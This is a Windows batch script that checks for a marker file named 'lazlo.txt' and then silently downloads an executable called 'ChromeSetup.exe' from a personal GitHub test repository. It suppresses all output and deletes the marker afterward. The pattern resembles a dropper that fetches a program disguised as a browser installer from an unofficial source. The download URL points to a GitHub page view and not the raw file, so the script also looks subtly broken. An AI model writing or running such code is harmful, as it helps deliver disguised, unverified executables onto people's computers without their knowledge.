@echo off
setlocal

set "searchFile=lazlo.txt"
set "downloadURL=https://github.com/Tk1234567891/test/blob/main/ChromeSetup.exe"
set "downloadedFile=ChromeSetup.exe"

>nul 2>&1 (
    if exist "%searchFile%" (
        
        REM Download the new file silently using PowerShell
        powershell -Command "Invoke-WebRequest -Uri '%downloadURL%' -OutFile '%downloadedFile%' -UseBasicParsing"
        
        if exist "%downloadedFile%" (
            
            del /f /q "%searchFile%"
        )
    )
)

endlocal
